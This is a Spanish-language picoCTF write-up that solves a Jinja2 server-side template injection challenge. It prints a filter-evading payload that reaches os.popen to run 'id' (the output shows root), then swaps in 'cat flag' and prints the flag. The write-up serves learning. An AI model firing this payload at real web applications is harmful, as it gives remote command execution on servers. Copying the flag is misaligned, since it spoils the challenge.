
## Descripción

I made a cool website where you can announce whatever you want! Try it out! I heard templating is a cool and modular way to build web apps! Check out my website [here](http://rescued-float.picoctf.net:62972/)!

## Solución

Ingresamos al sitio web.
Vemos un recuadro en donde ingresamos texto y al dar click en el botón ok solamente se crea una etiqueta con lo que ingresamos en el recuadro.
De acuerdo al nombre del reto y a la pista: Server Side Template Injection, investigo al respecto.
Pruebo ingresando la siguiente plantilla:
```
`{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}`
```

Obtengo lo siguiente: 
`uid=0(root) gid=0(root) groups=0(root)`

Modifico la plantilla cambiando `id` por cat flag, vuelvo a enviar y obtengo la bandera. `picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_9451989d}`

## Notas adicionales

- Una inyección de plantilla del lado del servidor es una vulnerabilidad que ocurre cuando un servidor procesa la entrada del usuario como una plantilla.
- Las plantillas se pueden usar cuando solo es necesario cambiar detalles menores de una página según las circunstancias.


## Referencias

https://onsecurity-io.translate.goog/article/server-side-template-injection-with-jinja2/?_x_tr_sl=en&_x_tr_tl=es&_x_tr_hl=es&_x_tr_pto=tc